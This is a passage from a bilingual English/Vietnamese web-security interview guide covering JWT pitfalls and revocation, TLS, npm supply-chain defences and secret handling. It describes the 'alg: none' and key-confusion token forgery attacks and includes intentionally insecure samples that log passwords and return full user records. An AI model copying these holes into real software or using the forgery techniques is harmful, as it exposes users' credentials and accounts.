The implementation stores refresh tokens in the database, either as hashed values or with a flag, so you can revoke individual tokens or all tokens for a user. The classic mistake is issuing refresh tokens as pure JWTs with no server-side storage — you can't revoke them because the server has no record of them."

**Trả lời (Tiếng Việt):**
"Refresh token rotation = mỗi lần dùng refresh token để lấy access token mới, server cũng issue refresh token mới và invalidate cái cũ. Mỗi refresh token là single-use. Không có rotation: stolen refresh token = catastrophic — attacker silently lấy access tokens mới vô thời hạn, dù user đổi password hay logout. Với rotation: nếu refresh token bị steal và attacker dùng nó, original token bị invalid. Lần sau legitimate user's app refresh (dùng original token đã bị supersede) → server detect token reuse → revoke tất cả refresh tokens của user → force full re-login. Implementation: lưu refresh tokens trong DB (hashed) để có thể revoke từng token hoặc tất cả. Lỗi kinh điển: issue refresh tokens như pure JWTs không có server-side storage → không revoke được."

---

**Q4 (Senior): "What are some known JWT security pitfalls that attackers have exploited?"**

**Model Answer:**
"There are several well-documented vulnerabilities that have appeared in JWT libraries and implementations.

The most famous is the `alg: none` attack. Early JWT libraries trusted the algorithm specified in the token header. An attacker could take a legitimate token, change the header to `alg: none`, remove the signature, and some libraries would happily accept it as valid — because `none` means no signature required. The fix is to always specify the expected algorithm explicitly in your verification call, never trust the token's header for that.

The second is the RS256/HS256 confusion attack. When a server expects RS256 — asymmetric signing with a public/private key pair — some libraries could be tricked by a token that claims to use HS256 — symmetric signing — where the attacker uses the server's public key as the HMAC secret. The server might verify using the public key as the HS256 secret and accept it. Again, fix by always specifying the expected algorithm.

A third practical issue is not validating the `exp` claim. Some implementations verify the signature but forget to check expiration, so revoked or old tokens keep working. Always check `exp`.

And a broader issue: using a weak secret for HS256. If the secret is short or guessable, attackers can brute-force valid tokens. The secret should be at minimum 256 bits of randomness."

**Trả lời (Tiếng Việt):**
"Nhiều well-documented vulnerabilities trong JWT libraries. (1) alg: none attack: early JWT libraries trust algorithm trong token header → attacker lấy legitimate token, đổi header thành alg: none, bỏ signature → một số libraries accept vì none = no signature required. Fix: luôn specify expected algorithm trong verification call, không trust token header. (2) RS256/HS256 confusion: server expect RS256 (asymmetric, public/private key pair) → một số libraries bị trick bởi token dùng HS256 với server's public key làm HMAC secret → server verify bằng public key làm HS256 secret và accept. Fix: luôn specify expected algorithm. (3) Không validate exp claim: verify signature nhưng quên check expiration. (4) Weak secret cho HS256: short/guessable secret → brute-force valid tokens. Secret phải ít nhất 256 bits randomness."

---

**Q5 (Senior): "How do you handle JWT revocation, since JWTs are stateless by design?"**

**Model Answer:**
"Stateless JWTs are paradoxical to revoke — the whole point is that the server doesn't maintain state about them. The pure stateless approach is: shorten expiration. A 15-minute access token means compromised tokens expire quickly anyway.

But that's not always sufficient. If you need to revoke a specific token — because a user logged out, changed their password, or their account was compromised — you have a few options.

The most common is a token blocklist. You store invalidated JWT IDs — the `jti` claim — in a fast store like Redis with an expiry matching the token's remaining lifetime. On every request, you check if the `jti` is blocklisted. This adds a database lookup, but it's lightweight with Redis.

An alternative is a version number or generation counter in the user record. Each JWT includes the user's current `tokenVersion`. When the user logs out or changes their password, you increment that counter. On validation, you check the JWT's version against the current one in the database. Any token with an old version is rejected. This is clean and doesn't require a growing blocklist.

For refresh tokens, as I mentioned, always store them server-side so you can revoke them. The stateless benefit comes from access tokens — short-lived and verified without database lookups. Refresh tokens are inherently stateful and should be treated that way."

**Trả lời (Tiếng Việt):**
"Stateless JWTs mâu thuẫn khi revoke — điểm mạnh là server không maintain state. Approach thuần stateless: shorten expiration (15 phút). Nhưng không phải lúc nào cũng đủ. Các options: (1) Token blocklist: lưu invalidated JWT IDs (jti claim) trong Redis với expiry match remaining lifetime → mỗi request check jti có bị blocklist không. Thêm database lookup nhưng nhẹ với Redis. (2) Version number/generation counter trong user record: mỗi JWT chứa tokenVersion của user → logout/đổi password increment counter → validation check JWT version với DB current → token version cũ bị reject. Clean, không cần growing blocklist. Refresh tokens: luôn lưu server-side để có thể revoke. Access tokens stateless (short-lived, verify không cần DB lookup). Refresh tokens stateful và nên được treat như vậy."

---

---

## 9. HTTPS and TLS

**Level:** [Junior] / [Mid]

**EN:** Why does HTTPS matter for web applications? What is certificate pinning?

**VI:** Tại sao HTTPS quan trọng với web apps? Certificate pinning là gì?

**Trả lời:**

```ts
/*
  HTTP: plain text → ai cũng đọc được (MITM attack)
  HTTPS = HTTP + TLS (Transport Layer Security)

  TLS cung cấp:
  1. Confidentiality: Mã hóa data giữa client và server
  2. Integrity: Data không bị thay đổi trong transit (MAC)
  3. Authentication: Server identity được verify bằng certificate

  TLS Handshake (đơn giản hóa):
  1. Client → Server: "ClientHello" (TLS version, cipher suites)
  2. Server → Client: Certificate (public key, CA signature)
  3. Client verify certificate với trusted CA list
  4. Key exchange (Diffie-Hellman) → session keys
  5. Symmetric encryption bắt đầu
*/

// Express HTTPS (production thường dùng nginx/load balancer terminate TLS)
import https from 'https';
import fs from 'fs';

const server = https.createServer({
  key: fs.readFileSync('./ssl/private.key'),
  cert: fs.readFileSync('./ssl/certificate.crt'),
  // TLS 1.2+ chỉ
  minVersion: 'TLSv1.2',
  // Loại bỏ weak cipher suites
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
  ].join(':'),
}, app);

// Redirect HTTP → HTTPS
const httpApp = express();
httpApp.use((req, res) => {
  res.redirect(301, `https://${req.headers.host}${req.url}`);
});

/*
  Certificate Pinning:
  - Ứng dụng "pin" (hard-code) certificate hoặc public key
  - Chỉ accept connections với certificate/key đúng
  - Ngăn MITM dù kẻ tấn công có trusted CA certificate
  - PHỔ BIẾN hơn trong mobile apps (Android/iOS)
  - Trong web: HPKP (HTTP Public Key Pinning) đã bị deprecated
  - Rủi ro: Nếu certificate expire/thay đổi → app broken

  Thay thế an toàn hơn:
  - Certificate Transparency (CT) — logs tất cả certs, dễ phát hiện rogue certs
  - CAA DNS records — chỉ cho phép specific CAs issue cert cho domain
*/
```

---

## 10. Dependency Vulnerabilities

**Level:** [Mid] / [Senior]

**EN:** How do you manage dependency vulnerabilities? Explain `npm audit`, Snyk, and supply chain attacks.

**VI:** Làm thế nào quản lý dependency vulnerabilities? Giải thích `npm audit`, Snyk, và supply chain attacks.

**Trả lời:**

```bash
# npm audit — kiểm tra vulnerabilities trong dependencies
npm audit

# Output ví dụ:
# found 3 vulnerabilities (1 low, 1 moderate, 1 high)
# run `npm audit fix` to fix them

# Tự động fix có thể
npm audit fix

# Fix với breaking changes (cẩn thận)
npm audit fix --force

# Chỉ xem summary
npm audit --summary

# Export JSON để CI process
npm audit --json > audit-report.json
```

```ts
// package.json — tự động check trong CI
{
  "scripts": {
    "audit:ci": "npm audit --audit-level=high",
    // Fail CI nếu có high/critical vulnerabilities
  }
}

// GitHub Actions
// jobs:
//   security:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v4
//       - uses: actions/setup-node@v4
//       - run: npm ci
//       - run: npm audit --audit-level=moderate
```

```ts
// ==============================
// Supply Chain Attacks
// ==============================

/*
  Supply chain attack: Tấn công thông qua dependencies của project

  Ví dụ thực tế:
  1. event-stream (2018): Malicious code added to popular package → đánh cắp Bitcoin wallets
  2. colors.js (2022): Author sabotage — vô hiệu hóa package (protest against FOSS exploitation)
  3. ua-parser-js (2021): Account hijack → malware inject vào npm package
  4. node-ipc (2022): Intentional malware targeting Russian/Belarusian IPs

  Phòng chống:
*/

// 1. Lock files — commit package-lock.json (npm) hoặc yarn.lock (yarn)
// Đảm bảo mọi người install đúng version

// 2. npm ci thay vì npm install trong CI
// npm ci: install từ lock file chính xác, fail nếu package.json != lock file
// CI/CD pipeline:
// run: npm ci --production

// 3. Audit trong CI
// run: npm audit --audit-level=high

// 4. Pinned versions
{
  "dependencies": {
    "lodash": "4.17.21",  // pinned exact version
    // "lodash": "^4.17.0" — có thể bị exploit nếu 4.17.x được publish với malware
  }
}

// 5. Snyk — comprehensive vulnerability scanning
// npm install -g snyk
// snyk auth
// snyk test           — kiểm tra vulnerabilities
// snyk monitor        — continuous monitoring
// snyk fix            — auto-fix

// Snyk trong GitHub Actions
// - name: Run Snyk to check for vulnerabilities
//   uses: snyk/actions/node@master
//   env:
//     SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

// 6. Dependabot (GitHub) — tự động PR để update dependencies
// .github/dependabot.yml
// version: 2
// updates:
//   - package-ecosystem: "npm"
//     directory: "/"
//     schedule:
//       interval: "weekly"
//     groups:
//       patch-updates:
//         update-types: ["patch"]

// 7. Kiểm tra package trước khi dùng
// - Downloads per week
// - Last published date
// - Maintainers count
// - Open issues/PRs
// - Source code review
// - bundlephobia.com — size và dependencies
```

---

## 11. Sensitive Data Exposure

**Level:** [Junior] / [Mid]

**EN:** What patterns lead to sensitive data exposure? How do you handle `.env` files, avoid logging secrets, and prevent secrets from ending up in git?

**VI:** Các pattern nào dẫn đến sensitive data exposure? Cách handle `.env`, tránh log secrets, và ngăn secrets vào git?

**Trả lời:**

```ts
// ==============================
// KHÔNG BAO GIỜ LOG SENSITIVE DATA
// ==============================

// XẤU
function loginHandler(email: string, password: string) {
  console.log(`Login attempt: ${email}:${password}`); // PASSWORD TRONG LOGS
  // ...
}

function apiRequest(headers: Headers) {
  console.log('Request headers:', headers); // TOKEN TRONG LOGS
}

// TỐT — log chỉ những gì cần thiết
function loginHandler(email: string, password: string) {
  console.log(`Login attempt for: ${email}`); // chỉ email
}

// Redact sensitive fields
function safeLog(obj: Record<string, unknown>) {
  const SENSITIVE_KEYS = ['password', 'token', 'authorization', 'secret', 'key', 'creditCard'];

  const redacted = Object.fromEntries(
    Object.entries(obj).map(([key, value]) => [
      key,
      SENSITIVE_KEYS.some((k) => key.toLowerCase().includes(k)) ? '[REDACTED]' : value,
    ])
  );

  console.log(JSON.stringify(redacted));
}

// ==============================
// .env Files
// ==============================

// .env.example — commit vào git (template, không có giá trị thật)
// DATABASE_URL=postgresql://localhost:5432/mydb
// JWT_SECRET=your-secret-here
// API_KEY=your-api-key-here

// .env — KHÔNG commit (gitignore)
// DATABASE_URL=postgresql://user:realpassword@prod-server:5432/mydb
// JWT_SECRET=super-secret-key-32-chars-minimum
// API_KEY=sk-real-api-key

// .gitignore
// .env
// .env.local
// .env.production
// .env.*.local

// Validate env vars khi startup (fail fast)
import { z } from 'zod';

const envSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  JWT_REFRESH_SECRET: z.string().min(32),
  SMTP_PASSWORD: z.string().min(1),
  PORT: z.coerce.number().default(3000),
});

// Throw nếu bất kỳ var nào missing/invalid
export const env = envSchema.parse(process.env);
// Từ đây dùng env.JWT_SECRET thay vì process.env.JWT_SECRET

// ==============================
// Frontend: VITE_* prefix
// ==============================

// .env (Vite)
// VITE_API_URL=https://api.example.com
// SECRET_KEY=should-not-be-here  ← KHÔNG accessible trong browser bundle
// VITE_PUBLIC_KEY=safe-to-expose  ← ACCESSIBLE trong browser

// Trong code
const apiUrl = import.meta.env.VITE_API_URL; // OK
const secret = import.meta.env.SECRET_KEY;   // undefined — không bị expose

// ==============================
// Git Secrets Prevention
// ==============================

// 1. Pre-commit hooks với Husky + detect-secrets
// pip install detect-secrets
// detect-secrets scan > .secrets.baseline

// .husky/pre-commit
// #!/bin/sh
// detect-secrets-hook --baseline .secrets.baseline

// 2. gitleaks — scan for secrets
// gitleaks detect --source . --verbose

// 3. Nếu đã commit secret — ĐÂY LÀ KHẨN CẤP
// Bước 1: Revoke secret ngay lập tức (generate new API key, password)
// Bước 2: Xóa khỏi git history
//   git filter-branch hoặc BFG Repo Cleaner
//   git filter-repo --invert-paths --path secrets.json
// Bước 3: Force push (với permission của team)
// Bước 4: Thông báo team pull lại

// QUAN TRỌNG: Kể cả sau khi xóa khỏi git history,
// nếu repo public → coi như secret đã bị compromise
// Luôn revoke và regenerate

// 4. GitHub secret scanning — tự động scan khi push
// Notify khi phát hiện known secret patterns (AWS keys, GitHub tokens, etc.)

// ==============================
// Response — không expose internals
// ==============================

// XẤU
app.get('/api/user/:id', async (req, res) => {
  const user = await db.user.findUnique({ where: { id: req.params.id } });
  res.json(user); // Trả về password hash, internal fields
});

// TỐT — whitelist fields
app.get('/api/user/:id', async (req, res) => {
  const user = await db.user.findUnique({
    where: { id: req.params.id },
    select: {
      id: true,
      name: true,
      email: true,
      createdAt: true,
      // password: false — không select
      // internalNotes: false
    },
  });
  res.json(user);
});

// Error responses — không expose stack traces in production
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  console.error(err); // log full error internally

  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' }); // vague message
  } else {
    res.status(500).json({ error: err.message, stack: err.stack }); // dev only
  }
});
```
